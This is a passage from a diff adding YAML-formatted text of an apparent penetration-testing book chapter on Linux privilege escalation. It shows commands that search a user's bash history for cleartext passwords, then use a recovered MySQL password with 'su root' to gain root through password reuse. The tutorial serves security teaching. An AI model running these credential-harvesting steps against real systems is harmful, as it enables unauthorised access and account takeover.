+    the **cat** utility in conjunction with the **grep** utility to display the contents
+    of the file and limit the output to only display commands that match a keyword.
+    This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**cat /home/user/.bash_history | grep "pass"**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This command will output a list of commands entered by a user in the past that
+    contain the **pass** keyword, with the aim of identifying any credentials that
+    may have been entered, as illustrated in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.20 – Analyzing Bash history'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_020.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.20 – Analyzing Bash history
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As highlighted in the preceding screenshot, we are able to identify an authentication
+    command to a local MySQL server that contains the username and password specified
+    in cleartext.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The **bash_history** file is used to store the command history of a particular
+    user. The **bash_history** file can be configured in the **.bashrc** configuration
+    file that is stored in the home directory of a user.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We can utilize these credentials for authentication with the MySQL server; however,
+    the server doesn't seem to be running a MySQL server at this point in its operation.
+    However, we can also utilize these credentials to authenticate to the root account
+    in the event of password reuse.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'This can be done by switching to the **root** user from our current user and
+    specifying the credentials we identified in the preceding screenshot, as follows:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**su root**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, authentication with the MySQL credentials
+    was successful, and we have successfully elevated our privileges to the highest
+    level on the target system:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.21 – Successful privilege escalation'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_021.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.21 – Successful privilege escalation
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, we can also use the **history** command on the target system
+    to output the entire history of commands that have been previously entered by
+    a user. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**history**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, we are able to identify an authentication
+    attempt to a MySQL server with the credentials specified in cleartext. We are
+    also able to identify potentially interesting files that could contain information
+    that could be useful in elevating our privileges on the target system, as shown
+    in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.22 – Analyzing command history'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_022.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 11.22 – Analyzing command history
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this case, we can utilize the MySQL credentials to elevate our privileges
+    to the highest level as the root user, as we have done previously.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We have been able to successfully elevate our privileges by searching for and
+    identifying locally stored credentials through various techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we got started by taking a look at how to extract application
+    passwords from memory with the GDB. We then took an in-depth look at how to search
+    for and identify passwords in configuration files, both manually and automatically.
+    We finally ended the chapter by taking a look at how to locate passwords from
+    the **bash_history** file of a particular user.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have learned how to elevate our privileges by finding locally stored
+    passwords on Linux systems, we can begin exploring other Linux privilege escalation
+    vectors.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we will explore the process of elevating our privileges
+    through misconfigured scheduled tasks.
+  prefs: []
+  type: TYPE_NORMAL
